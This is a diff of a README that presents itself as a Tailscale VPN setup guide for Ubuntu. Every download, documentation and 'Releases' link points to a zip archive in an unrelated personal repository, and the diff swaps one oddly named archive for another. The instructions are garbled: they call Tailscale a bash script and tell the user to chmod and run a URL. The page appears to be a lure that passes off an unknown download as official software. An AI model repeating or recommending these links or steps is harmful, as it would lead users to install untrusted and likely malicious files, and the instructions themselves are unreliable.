@@ -1,7 +1,7 @@
 # 🐧 tailscale - Simple VPN Setup for Ubuntu
 
 ## 🔗 Download Now
-[![Download Tailscale](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip%https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip)](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip)
+[![Download Tailscale](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip%https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip)](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run Tailscale on your Ubuntu system. Tailscale is a bash script that simplifies the installation and configuration of Tailscale, making it easy for you to set up a secure VPN connection.
@@ -16,7 +16,7 @@ To use Tailscale, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit the following page to download the latest version of the Tailscale script:
 
-[Download Tailscale](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip)
+[Download Tailscale](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip)
 
 Once you are on the Releases page, look for the latest version. Download the script file by clicking on the appropriate link.
 
@@ -30,13 +30,13 @@ Once you are on the Releases page, look for the latest version. Download the scr
    
 3. **Change File Permissions:** Make the script executable by running:
    ```bash
-   chmod +x https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip
+   chmod +x https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip
    ```
-   Replace `https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip` with the actual name of the downloaded file if it differs.
+   Replace `https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip` with the actual name of the downloaded file if it differs.
 
 4. **Run the Script:** Execute the installation script by typing:
    ```bash
-   https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip
+   https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip
    ```
 
 5. **Follow On-Screen Instructions:** The script will guide you through the installation process. Simply follow the prompts in your terminal.
@@ -66,8 +66,8 @@ This command will display the devices connected to your Tailscale network.
 ## 📄 Resources
 For further reading and troubleshooting, refer to these resources:
 
-- [Tailscale Documentation](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip)
+- [Tailscale Documentation](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip)
 
 ## 🛠 Troubleshooting
 If you encounter issues during installation or configuration:
@@ -80,4 +80,4 @@ If you encounter issues during installation or configuration:
 For additional help, join our community discussions on GitHub or reach out via email for support.
 
 ## 👍 Conclusion
-You are now ready to use Tailscale for secure and easy access to your devices. Follow the steps above to enjoy a seamless VPN experience on your Ubuntu system. Make sure to keep your Tailscale installation updated by checking back on the [Releases page](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software-2.5.zip) regularly.
+You are now ready to use Tailscale for secure and easy access to your devices. Follow the steps above to enjoy a seamless VPN experience on your Ubuntu system. Make sure to keep your Tailscale installation updated by checking back on the [Releases page](https://raw.githubusercontent.com/MilanMishutushkin/tailscale/main/querulosity/Software_unsympathetically.zip) regularly.
